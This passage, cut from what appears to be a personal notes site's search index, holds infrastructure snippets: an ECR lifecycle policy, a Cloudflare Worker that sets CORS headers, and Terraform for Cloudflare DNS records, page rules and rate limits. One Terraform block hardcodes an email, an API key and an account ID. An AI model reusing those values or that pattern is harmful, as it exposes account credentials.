style=\"color:#e6db74\"\u003e\u0026#34;untagged\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countType\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sinceImagePushed\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countUnit\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;days\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countNumber\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;expire\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"AWS Configure"},{"categories":null,"contents":" tf Provider provider.tf EC2 ec2.tf initial.bash Elastic IP elasticip.tf MQ mq.tf RDS rds.tf Security Group sg.tf VPC vpc.tf WAF waf.tf ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/aws/terraform/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etf\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"provider\"\u003eProvider\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/provider.tf\"\u003eprovider.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"ec2\"\u003eEC2\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/ec2.tf\"\u003eec2.tf\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/initial.bash\"\u003einitial.bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"elastic-ip\"\u003eElastic IP\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/elasticip.tf\"\u003eelasticip.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"mq\"\u003eMQ\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/mq.tf\"\u003emq.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rds\"\u003eRDS\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/rds.tf\"\u003erds.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"security-group\"\u003eSecurity Group\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/sg.tf\"\u003esg.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"vpc\"\u003eVPC\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/vpc.tf\"\u003evpc.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"waf\"\u003eWAF\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/aws/terraform/hcl/waf.tf\"\u003ewaf.tf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"AWS Terraform"},{"categories":null,"contents":" Setting CloudFlare Worker for CORS addEventListener(\u0026#34;fetch\u0026#34;, (event) =\u0026gt; { event.respondWith(handleRequest(event.request)); }); async function handleRequest(request) { let response = await fetch(request); response = new Response(response.body, response); response.headers.set( \u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;frontend-h5.shyc883.com\u0026#34; ); response.headers.set(\u0026#34;Access-Control-Allow-Methods\u0026#34;, \u0026#34;GET, OPTIONS, POST\u0026#34;); response.headers.set( \u0026#34;Access-Control-Allow-Headers\u0026#34;, \u0026#34;Content-Type, Authorization\u0026#34; ); response.headers.set(\u0026#34;Access-Control-Allow-Credentials\u0026#34;, true); return response; } Terraform_create_record terraform { required_providers { cloudflare = { source = \u0026#34;cloudflare/cloudflare\u0026#34; version = \u0026#34;~\u0026gt; 2.0\u0026#34; } } } provider \u0026#34;cloudflare\u0026#34; { email = \u0026#34;cloudflare@gmail.com\u0026#34; api_key = \u0026#34;1488ed0d2082ed36c010b773431fd9dcacde1\u0026#34; account_id = \u0026#34;06ae012a1ba907df24a220cd14a4fa8b\u0026#34; } resource \u0026#34;cloudflare_record\u0026#34; \u0026#34;gitlab\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; name = \u0026#34;gitlab\u0026#34; value = \u0026#34;192.123.168.234\u0026#34; type = \u0026#34;A\u0026#34; ttl = 300 proxied = true } Terraform_create_page_rule # Add a page rule to the domain resource \u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;page_rule_png\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; target = \u0026#34;www.example.com/*.png*\u0026#34; status = \u0026#34;active\u0026#34; actions { always_use_https = \u0026#34;true\u0026#34; browser_cache_ttl = 86400 cache_level = \u0026#34;cache_everything\u0026#34; # edge_cache_ttl = 86400 cache_key_fields { cookie {} header {} host {} query_string { ignore = true } user {} } # cache_ttl_by_status { # codes = \u0026#34;200-299\u0026#34; # ttl = 300 # } # cache_ttl_by_status { # codes = \u0026#34;300-399\u0026#34; # ttl = 60 # } # cache_ttl_by_status { # codes = \u0026#34;400-403\u0026#34; # ttl = -1 # } # cache_ttl_by_status { # codes = \u0026#34;404\u0026#34; # ttl = 30 # } # cache_ttl_by_status { # codes = \u0026#34;405-499\u0026#34; # ttl = -1 # } # cache_ttl_by_status { # codes = \u0026#34;500-599\u0026#34; # ttl = 0 # } # } } # resource \u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;rules\u0026#34; { # count = \u0026#34;${length(keys(\u0026#34;${var.targets}\u0026#34;))}\u0026#34; # lifecycle { # create_before_destroy = true # } # zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; # target = \u0026#34;${var.targets[element(keys(var.targets),count.index)]}\u0026#34; # actions { # always_use_https = \u0026#34;true\u0026#34; # cache_level = \u0026#34;cache_everything\u0026#34; # } # priority = \u0026#34;${count.index + 1}\u0026#34; # } Terraform_create_rate_limit_rule # Create rate limit rule resource \u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;wss_rate_limit\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; threshold = 50 period = 60 match { request { url_pattern = \u0026#34;*wss*/*\u0026#34; } } action { mode = \u0026#34;ban\u0026#34; timeout = 3600 } correlate { by = \u0026#34;nat\u0026#34; } } resource \u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;frontend_rate_limit\u0026#34; { zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34; threshold = 50 period = 10 match { request { url_pattern = \u0026#34;*h5*/*\u0026#34; } } action { mode = \u0026#34;ban\u0026#34; timeout = 3600 } correlate { by = \u0026#34;nat\u0026#34; } } API Document Cloudflare for SaaS partial (CNAME) zone ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/cloudflare/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSetting CloudFlare Worker for CORS\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddEventListener\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fetch\u0026#34;\u003c/span\u003e, (\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003erespondWith\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehandleRequest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eevent\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003easync\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehandleRequest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efetch\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eResponse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Origin\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;frontend-h5.shyc883.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Methods\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;GET, OPTIONS, POST\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Headers\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type, Authorization\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eheaders\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eset\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Access-Control-Allow-Credentials\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTerraform_create_record\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-hcl\" data-lang=\"hcl\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eterraform\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003erequired_providers\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cloudflare \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      source \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare/cloudflare\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      version \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;~\u0026gt; 2.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eprovider\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  email   \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare@gmail.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  api_key \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1488ed0d2082ed36c010b773431fd9dcacde1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  account_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;06ae012a1ba907df24a220cd14a4fa8b\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_record\u0026#34; \u0026#34;gitlab\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name    \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;gitlab\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  value   \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.123.168.234\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  type    \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;A\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ttl     \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  proxied \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTerraform_create_page_rule\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-hcl\" data-lang=\"hcl\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Add a page rule to the domain\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;page_rule_png\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  target \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;www.example.com/*.png*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  status   \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;active\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eactions\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    always_use_https \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    browser_cache_ttl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e86400\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cache_level \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cache_everything\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e    # edge_cache_ttl = 86400\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003ecache_key_fields\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ecookie\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eheader\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ehost\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003equery_string\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ignore \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003euser\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #   cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;200-299\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 300\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;300-399\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 60\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;400-403\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = -1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;404\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 30\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 